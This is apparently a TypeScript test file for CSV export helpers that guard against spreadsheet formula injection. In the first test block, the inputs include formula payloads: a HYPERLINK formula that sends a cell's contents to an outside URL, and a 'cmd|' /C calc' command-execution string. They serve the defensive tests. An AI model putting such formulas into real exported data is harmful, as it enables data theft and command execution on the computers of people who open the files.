import { describe, expect, it } from "vitest";
import { celdaCSV, celdaSegura, filasCSV } from "./csv";

describe("celdaSegura", () => {
  it("neutraliza lo que una hoja de cálculo leería como fórmula", () => {
    expect(celdaSegura('=HYPERLINK("https://x/?d="&E2;"Ver")')).toBe(
      `'=HYPERLINK("https://x/?d="&E2;"Ver")`,
    );
    expect(celdaSegura("+cmd")).toBe("'+cmd");
    expect(celdaSegura("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0");
    expect(celdaSegura("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(celdaSegura("\t=1+1")).toBe("'\t=1+1");
    expect(celdaSegura("\r=1+1")).toBe("'\r=1+1");
  });

  it("deja igual el texto normal", () => {
    expect(celdaSegura("Cliente Demo SL")).toBe("Cliente Demo SL");
    expect(celdaSegura("compras@cliente.test")).toBe("compras@cliente.test");
    expect(celdaSegura("a=b")).toBe("a=b");
    expect(celdaSegura("")).toBe("");
  });

  it("no toca números ni texto que solo es un número", () => {
    expect(celdaSegura(-12.5)).toBe("-12.5");
    expect(celdaSegura("-12,50")).toBe("-12,50");
    expect(celdaSegura("+34")).toBe("+34");
    expect(celdaSegura("-1.234,56 €")).toBe("-1.234,56 €");
    expect(celdaSegura("-5%")).toBe("-5%");
  });

  it("nulos como celda vacía", () => {
    expect(celdaSegura(null)).toBe("");
    expect(celdaSegura(undefined)).toBe("");
  });
});

describe("celdaCSV y filasCSV", () => {
  it("entrecomilla, dobla comillas y neutraliza", () => {
    expect(celdaCSV('di "hola"')).toBe('"di ""hola"""');
    expect(celdaCSV("=1+1")).toBe(`"'=1+1"`);
  });

  it("une filas y columnas", () => {
    expect(
      filasCSV([
        ["Nombre", "Total"],
        ["=MAL()", -3],
      ]),
    ).toBe(`"Nombre","Total"\n"'=MAL()","-3"`);
  });
});
